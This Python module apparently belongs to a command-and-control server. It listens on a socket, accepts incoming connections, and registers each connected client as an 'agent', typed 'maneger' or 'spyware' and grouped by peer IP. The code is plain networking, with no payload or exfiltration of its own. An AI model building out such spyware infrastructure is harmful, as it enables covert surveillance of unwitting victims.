import threading
from agent import Agent
from listener import Listener
from operation import Operation
from connection import Connection


class RecruitmentHandler(threading.Thread):

    def __init__(self, conn: Connection, type: str, oper_dict: dict[str, Operation]):
        super().__init__()
        self.conn = conn
        self.type = type
        self.oper_dict = oper_dict

    def run(self) -> tuple[str, Agent]:
        self.agent = Agent(self.conn, self.type)
        self.name = self.conn.peer_ip
        if self.name not in self.oper_dict.keys():
            self.oper_dict[self.name] = Operation()
        self.oper_dict[self.name].addAgent(self.agent, self.type)


class AgentRecruiter(threading.Thread):

    def __init__(
        self,
        host: str,
        port: int,
        oper_dict: dict[str, Operation],
        type: str,  # "maneger" or "spyware"
    ):
        super().__init__()
        self._stop_event = threading.Event()
        self.oper_dict = oper_dict
        self.listener = Listener(host, port)
        self.type = type

    def run(self):
        with self.listener as listener:
            while not self._stop_event.is_set():
                conn = listener.accept()
                handler = RecruitmentHandler(conn, self.type, self.oper_dict)
                handler.start()
